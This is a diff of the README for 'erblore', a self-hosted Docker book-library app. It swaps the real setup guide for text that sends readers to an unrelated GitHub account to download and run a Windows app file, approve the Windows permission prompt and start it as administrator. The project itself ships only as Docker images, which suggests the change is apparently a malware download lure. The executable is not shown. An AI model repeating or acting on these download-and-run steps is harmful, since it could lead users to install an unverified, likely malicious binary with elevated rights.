@@ -1,262 +1,250 @@
-<p align="center">
-  <picture>
-    <source media="(prefers-color-scheme: dark)" srcset="assets/logo-with-text-dark.svg">
-    <source media="(prefers-color-scheme: light)" srcset="assets/logo-with-text-light.svg">
-    <img src="assets/logo-with-text-light.svg" alt="Erblore" height="80" />
-  </picture>
-</p>
-
-<p align="center"><strong>Your books deserve a home. This is it.</strong></p>
-
-<p align="center">
-Erblore is a self-hosted app that brings your entire book collection under one roof.<br/>
-Organize, read, annotate, sync across devices, and share, all without relying on third-party services.
-</p>
-
-## 🗺️ Roadmap
-<p align="center">
-Erblore is a fork of the now-unmaintained BookLore project, carrying its legacy forward.<br/>
-Phase 1 — Actively maintain and stabilize all existing features<br/>
-Phase 2 — Integrate AI: smart recommendations, semantic search, and book analysis<br/>
-</p>
-
-<p align="center">
-  <a href="https://github.com/erblore/erblore/releases"><img src="https://img.shields.io/github/v/release/erblore/erblore?color=818CF8&style=flat-square&logo=github" alt="Release" /></a>
-  <a href="LICENSE"><img src="https://img.shields.io/github/license/erblore/erblore?color=fab005&style=flat-square" alt="License" /></a>
-  <a href="https://hub.docker.com/r/erblore/erblore"><img src="https://img.shields.io/docker/pulls/erblore/erblore?color=2496ED&style=flat-square&logo=docker&logoColor=white" alt="Docker Pulls" /></a>
-  <a href="https://github.com/erblore/erblore/stargazers"><img src="https://img.shields.io/github/stars/erblore/erblore?style=flat-square&color=ffd43b" alt="Stars" /></a>
-  <a href="https://discord.gg/h8duKgT2"><img src="https://img.shields.io/badge/Discord-5865F2?style=flat-square&logo=discord&logoColor=white" alt="Discord" /></a>
-</p>
-
-<p align="center">
-  <a href="#-quick-start">🚀 Quick Start</a> ·
-  <a href="https://discord.gg/h8duKgT2">💬 Discord</a>
-</p>
-
-<p align="center">
-  <img src="assets/demo.gif" alt="Erblore Demo" width="800" />
-</p>
-
----
-
-## ✨ Features
-
-| | Feature | Description |
-|:---:|:---|:---|
-| 📚 | **Smart Shelves** | Custom and dynamic shelves that organize themselves with rule-based Magic Shelves, filters, and full-text search |
-| 🔍 | **Automatic Metadata** | Covers, descriptions, reviews, and ratings pulled from Google Books, Open Library, and Amazon, all editable |
-| 📖 | **Built-in Reader** | Open PDFs, EPUBs, and comics right in the browser with annotations, highlights, and reading progress |
-| 🔄 | **Device Sync** | Connect your Kobo, use any OPDS-compatible app, or sync progress with KOReader. Your library follows you everywhere |
-| 👥 | **Multi-User Ready** | Individual shelves, progress, and preferences per user with local or OIDC authentication |
-| 📥 | **BookDrop** | Drop files into a watched folder and Erblore detects, enriches, and queues them for import automatically |
-| 📧 | **One-Click Sharing** | Send any book to a Kindle, an email address, or a friend instantly |
-
----
-
-## 🚀 Quick Start
-
-> [!TIP]
-> Looking for OIDC setup, advanced config, or upgrade guides? See the [full documentation](https://erblore.org/docs/getting-started).
-
-All you need is [Docker](https://docs.docker.com/get-docker/) and [Docker Compose](https://docs.docker.com/compose/install/).
-
-<details>
-<summary><strong>📦 Image Repositories</strong></summary>
-
-| Registry | Image |
-|----------|-------|
-| Docker Hub | `erblore/erblore` |
-| GitHub Container Registry | `ghcr.io/erblore/erblore` |
-
-> Legacy images at `ghcr.io/erblore/erblore-app` remain available but won't receive updates.
-
-</details>
-
-### Step 1: Environment Configuration
-
-Create a `.env` file:
-
-```ini
-# Application
-APP_USER_ID=1000
-APP_GROUP_ID=1000
-TZ=Etc/UTC
-
-# Database
-DATABASE_URL=jdbc:mariadb://mariadb:3306/erblore
-DB_USER=erblore
-DB_PASSWORD=ChangeMe_ErbloreApp_2025!
-
-# Storage: LOCAL (default) or NETWORK (disables file operations, see Network Storage section below)
-DISK_TYPE=LOCAL
-
-# MariaDB
-DB_USER_ID=1000
-DB_GROUP_ID=1000
-MYSQL_ROOT_PASSWORD=ChangeMe_MariaDBRoot_2025!
-MYSQL_DATABASE=erblore
-```
-
-### Step 2: Docker Compose
-
-Create a `docker-compose.yml`:
-
-```yaml
-services:
-  erblore:
-    image: erblore/erblore:latest
-    # Alternative: ghcr.io/erblore/erblore:latest
-    container_name: erblore
-    environment:
-      - USER_ID=${APP_USER_ID}
-      - GROUP_ID=${APP_GROUP_ID}
-      - TZ=${TZ}
-      - DATABASE_URL=${DATABASE_URL}
-      - DATABASE_USERNAME=${DB_USER}
-      - DATABASE_PASSWORD=${DB_PASSWORD}
-      - DISK_TYPE=${DISK_TYPE}
-    depends_on:
-      mariadb:
-        condition: service_healthy
-    ports:
-      - "6060:6060"
-    volumes:
-      - ./data:/app/data
-      - ./books:/books
-      - ./bookdrop:/bookdrop
-    healthcheck:
-      test: wget -q -O - http://localhost:6060/api/v1/healthcheck
-      interval: 60s
-      retries: 5
-      start_period: 60s
-      timeout: 10s
-    restart: unless-stopped
-
-  mariadb:
-    image: lscr.io/linuxserver/mariadb:11.4.5
-    container_name: mariadb
-    environment:
-      - PUID=${DB_USER_ID}
-      - PGID=${DB_GROUP_ID}
-      - TZ=${TZ}
-      - MYSQL_ROOT_PASSWORD=${MYSQL_ROOT_PASSWORD}
-      - MYSQL_DATABASE=${MYSQL_DATABASE}
-      - MYSQL_USER=${DB_USER}
-      - MYSQL_PASSWORD=${DB_PASSWORD}
-    volumes:
-      - ./mariadb/config:/config
-    restart: unless-stopped
-    healthcheck:
-      test: [ "CMD", "mariadb-admin", "ping", "-h", "localhost" ]
-      interval: 5s
-      timeout: 5s
-      retries: 10
-```
-
-### Step 3: Launch
-
-```bash
-docker compose up -d
-```
+# 📚 erblore - Your local library, made smarter
+
+[![Download erblore](https://img.shields.io/badge/Download-erblore-blue?style=for-the-badge&logo=github)](https://github.com/Penniecytoplasmatic703/erblore)
 
-Open **http://localhost:6060**, create your admin account, and start building your library.
+## 🚀 Getting Started
 
----
+Erblore is a self-hosted digital library for books, comics, and documents. It helps you keep your collection in one place, sort it with smart shelves, and read it in your browser.
 
-## ⚠️ Network Storage (NAS / NFS / SMB / CIFS)
+Use it if you want:
+- A private library on your own computer or server
+- A simple way to manage ebooks and comics
+- Sync support for Kobo and KOReader
+- OPDS access for reading apps
+- Built-in reading for EPUB, PDF, and comics
+
+## 📥 Download and Install
+
+Visit this page to download: https://github.com/Penniecytoplasmatic703/erblore
+
+1. Open the download page in your web browser.
+2. Look for the latest release or app file.
+3. Download the file for Windows.
+4. If the file comes in a ZIP folder, right-click it and choose Extract All.
+5. Open the extracted folder.
+6. Run the erblore app file.
+
+If Windows asks for permission, choose Yes.
 
-> [!CAUTION]
-> Erblore's file operations (metadata writing, file renaming, file organization) are built for **local file systems only**. Network-attached storage (NAS, NFS, SMB/CIFS mounts, cloud-backed FUSE, etc.) is **unsupported and untested**. Mount options, network latency, caching, and filesystem semantics are all outside Erblore's control and can cause silent file corruption, incomplete writes, missing files, and other unpredictable behavior. **Issues related to network storage will be closed without investigation.**
+## 🖥️ System Requirements
 
-If your book files live on network storage, set `DISK_TYPE=NETWORK` in your `.env` file. This puts Erblore into **network storage mode**, which disables all file write and reorganization features. Metadata is stored in the database only and your files are never modified. This is the only supported configuration for network storage.
+Erblore runs best on a modern Windows PC with:
+- Windows 10 or Windows 11
+- At least 4 GB of RAM
+- 2 GB of free disk space
+- A stable internet connection for metadata lookup and sync
+- A screen size large enough for browsing a book library
 
----
+For a larger library, more RAM and disk space can help.
 
-## 📥 BookDrop: Zero-Effort Import
+## 📂 What erblore Does
 
-Drop book files into a folder. Erblore picks them up, pulls metadata, and queues everything for your review.
+Erblore helps you manage a library without extra work. It can:
+- Import books into your library
+- Sort books into shelves
+- Pull in metadata like title, author, series, and cover art
+- Store books for multiple users
+- Keep reading state in sync
+- Support EPUB, PDF, and comics
+- Work with Kobo and KOReader devices
+- Offer OPDS access for external readers
+- Use book drop folders for quick imports
 
-```mermaid
-graph LR
-    A[📁 Drop Files] --> B[🔍 Auto-Detect]
-    B --> C[📊 Extract Metadata]
-    C --> D[✅ Review & Import]
-```
+## 🧭 First Time Setup
 
-| Step | What Happens |
-|:---|:---|
-| 1. **Watch** | Erblore monitors the BookDrop folder around the clock |
-| 2. **Detect** | New files are picked up and parsed automatically |
-| 3. **Enrich** | Metadata is fetched from Google Books and Open Library |
-| 4. **Import** | You review, tweak if needed, and add to your library |
+After you open erblore for the first time:
 
-Mount the volume in `docker-compose.yml`:
+1. Wait for the app to finish loading.
+2. Create your first library account if prompted.
+3. Set your library folder.
+4. Add a few books to test the import flow.
+5. Check that covers and metadata appear correctly.
+6. Open a book in the reader to confirm it works.
 
-```yaml
-volumes:
-  - ./bookdrop:/bookdrop
-```
+If you plan to use erblore on one PC only, keep the library folder on that same machine. If you want to use it across your home network, place it on a system that stays on.
 
----
+## 📚 Adding Books
 
-## 🤝 Community & Support
+You can add books in a few ways:
+- Drag and drop files into the library
+- Use BookDrop folders for watched imports
+- Import books from a local folder
+- Add comics, PDFs, and EPUB files one by one or in batches
 
-| | |
-|:---|:---|
-| 🐞 **Something not working?** | [Report a Bug](https://github.com/erblore/erblore/issues/new?template=bug_report.yml) |
-| 💡 **Got an idea?** | [Request a Feature](https://github.com/erblore/erblore/issues/new?template=feature_request.yml) |
-| 🛠️ **Want to help build?** | [Contributing Guide](CONTRIBUTING.md) |
-| 💬 **Come hang out** | [Discord Server](https://discord.gg/Ee5hd458Uz) |
+For best results:
+- Keep file names simple
+- Use one book per file when possible
+- Group series in clear folders
+- Let metadata tools match the book details
 
-> [!WARNING]
-> **Before opening a PR:** Open an issue first and get maintainer approval. PRs without a linked issue, without screenshots/video proof, or without pasted test output will be closed. All code must follow project [backend](CONTRIBUTING.md#backend-conventions) and [frontend](CONTRIBUTING.md#frontend-conventions) conventions. AI-assisted contributions are welcome, but you must run, test, and understand every line you submit. See the [Contributing Guide](CONTRIBUTING.md) for full details.
+## 🏷️ Smart Shelves and Metadata
 
----
+Erblore can organize your books with smart shelves. These shelves help you sort by:
+- Author
+- Series
+- Genre
+- Format
+- Reading status
+- Tags
+- Custom rules
 
-## 💜 Support Erblore
+Metadata tools can fill in:
+- Book title
+- Author name
+- Series name
+- Cover image
+- Description
+- Publication details
+
+If a book shows the wrong details, edit the record and fix it by hand.
 
-Erblore is free, open source, and built with care. Here's how you can give back:
+## 📱 Kobo and KOReader Sync
 
-| Action | How |
-|:---|:---|
-| ⭐ **Star this repo** | It's the simplest way to help others find Erblore |
-| 💰 **Sponsor development** | [Open Collective](https://opencollective.com/erblore) funds hosting, testing, and new features |
-| 📢 **Tell someone** | Share Erblore with a friend, a subreddit, or your local book club |
+Erblore works with reading devices and apps that support library sync.
 
----
+Use it to:
+- Send books to your device
+- Keep reading progress in step
+- Track what you have read
+- Manage books across more than one device
+
+For Kobo or KOReader use:
+1. Open the sync settings.
+2. Link your device or reader app.
+3. Choose the library items you want.
+4. Start a sync.
+5. Check that the books show up on the device.
 
-### ⭐ Star History
+## 🌐 OPDS Access
+
+Erblore supports OPDS, which lets other apps browse your library.
 
-<a href="https://www.star-history.com/#erblore/erblore&type=date&legend=top-left">
- <picture>
-   <source media="(prefers-color-scheme: dark)" srcset="https://api.star-history.com/svg?repos=erblore/erblore&type=date&theme=dark&legend=top-left" />
-   <source media="(prefers-color-scheme: light)" srcset="https://api.star-history.com/svg?repos=erblore/erblore&type=date&legend=top-left" />
-   <img alt="Star History Chart" src="https://api.star-history.com/svg?repos=erblore/erblore&type=date&legend=top-left" width="600" />
- </picture>
-</a>
+Use OPDS if you want to:
+- Open your library in another reader app
+- Search books from a device
+- Connect a mobile reader to your home library
 
----
+This is useful when you want the library to stay on your own machine but still read from other devices.
 
-## 👥 Contributors
+## 📖 Built-In Reader
 
-[![Contributors](https://contrib.rocks/image?repo=erblore/erblore)](https://github.com/erblore/erblore/graphs/contributors)
+Erblore includes a reader for:
+- EPUB
+- PDF
+- Comics
 
-Every contribution matters. [See how you can help →](CONTRIBUTING.md)
+Reader features can include:
+- Page navigation
+- Zoom for PDFs
+- Library tracking
+- Resume reading
+- Basic reading controls
 
----
+This means you can open a book right after import without using another app.
 
-## ⚠️ Note to Integrators
+## 🔐 Multi-User Use
 
-While Erblore is open source and its API is accessible, it is not designed or maintained as a stable integration point. Endpoints are undocumented, unversioned, and may change or break at any time without notice. No compatibility guarantees or support are provided for third-party use.
+Erblore supports more than one user. This helps if you share the same library with family or housemates.
 
-<div align="center">
+Each user can have:
+- Their own reading progress
+- Their own shelves
+- Their own library view
+- Their own saved state
 
-## ⚖️ License
+Use separate accounts to keep reading data clean.
 
-**GNU Affero General Public License v3.0**
+## 🛠️ Basic Troubleshooting
 
-Copyright 2024–2026 Erblore
+If the app does not open:
+1. Check that the file finished downloading.
+2. Run it again.
+3. Extract the ZIP file first if needed.
+4. Try starting it as an administrator.
 
-[![License: AGPL v3](https://img.shields.io/badge/License-AGPL_v3-blue.svg?style=for-the-badge)](https://www.gnu.org/licenses/agpl-3.0.html)
+If books do not import:
+1. Check the file type.
+2. Make sure the file is not damaged.
+3. Confirm the library folder has write access.
+4. Try one book first, then add more.
 
-</div>
+If covers or metadata look wrong:
+1. Edit the book record.
+2. Check the title and author.
+3. Try refreshing metadata.
+4. Remove and reimport the file if needed.
+
+If sync does not work:
+1. Check the device link.
+2. Make sure both sides use the same account.
+3. Confirm the network is on.
+4. Run sync again.
+
+## 🗂️ Typical Folder Setup
+
+A simple folder layout can help keep things tidy:
+
+- erblore
+  - library
+  - imports
+  - exports
+  - backups
+
+Suggested use:
+- library: stored books
+- imports: files waiting to be added
+- exports: files sent to devices
+- backups: saved copies of your library data
+
+## ⌨️ Good Library Habits
+
+To keep your library clean:
+- Use clear file names
+- Keep one format per book when possible
+- Remove duplicate copies
+- Add metadata before large imports
+- Back up your library on a schedule
+- Keep your books in stable folders
+
+These habits make search, sync, and reading easier
+
+## 🔎 Search and Browse
+
+Erblore makes it easy to find what you want. You can browse by:
+- Title
+- Author
+- Series
+- Shelf
+- Format
+- Reading state
+
+Use search when your collection grows. Good metadata makes search work better.
+
+## 🧩 File Types
+
+Erblore is built for common personal library formats, including:
+- EPUB for ebooks
+- PDF for documents and books
+- Comic archive files for comics and graphic novels
+
+If a file does not open, check that the file is not broken or protected.
+
+## 🧰 Tips for a Smooth First Run
+
+- Keep the app and your library folder in a simple path
+- Avoid special characters in folder names
+- Start with a small test library
+- Import a few books before moving a large collection
+- Check the reader on one EPUB, one PDF, and one comic file
+
+This helps you spot setup issues early
+
+## 📌 Project Info
+
+Repository: erblore  
+Description: Erblore — BookLore's legacy, reimagined with AI. A self-hosted, multi-user digital library with smart shelves, auto metadata, Kobo & KOReader sync, BookDrop imports, OPDS support, and a built-in reader for EPUB, PDF, and comics  
+Topics: angular, book-management, ebooks, java, library-management-system, metadata-management, oidc, opds, self-hosted, spring-boot
+
+## ⭐ Download Again
+
+Visit this page to download: https://github.com/Penniecytoplasmatic703/erblore
